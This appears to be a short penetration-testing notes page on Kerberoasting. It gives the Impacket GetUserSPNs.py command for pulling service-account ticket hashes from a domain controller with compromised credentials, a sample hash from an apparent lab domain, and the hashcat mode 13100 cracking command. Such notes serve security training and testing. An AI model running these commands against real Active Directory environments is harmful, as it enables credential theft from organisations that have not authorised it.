# Kerberoasting

Kerberoasting is the process of obtaining hashes of service accounts within active directory and cracking them to reveal their plain-text credentials.

## Impacket GetUserSPNs.py

The Impacket tool suite, available from https://github.com/SecureAuthCorp/impacket, includes the script GetUserSPNs.py.  Once a domain account has been compromised, this script can be used against a domain controller to obtain the hash of a service account.  The following command will dump the hash:

`sudo python3 GetUserSPNs.py <domain_name>/<username>:<password> -dc-ip <domain_controller_IP_address> -request`

This should return a hash in the following format:

```
$krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$b2afd9bf0f7c3ddbb45d9dbac43f4869$aec752a093ee2ee1f37171fca471b9131a4c40a67a73fdf765160da61da02eefaf455cf1f93d859b026d90820673057eb3bedcc58f1919b113204f78e1ea7c3ba796a08ac41aa8e7314fc2f74daaee5f7a8cf4b2eae9ca71d1cf024b584c2a696dc9c25abefa28b643f829f2656d6a392cf1dfa88023b7dadba8fb5e54fc736dc0dae2674635222d52013d871969b3c1cfa503fc2e7173f[...SNIP...]
```

## Cracking the hash using HashCat

Hashcat can be used with a password list in an attempt to obtain the plain-text of the password.  In this case mode 13100 "Kerberos 5 TGS-REP" can be used:

`hashcat64.exe -m 13100 kerberos_hash.txt /path/to/password_list.txt`

If the password is present in the password list, HashCat will display the plain-text password once cracked.
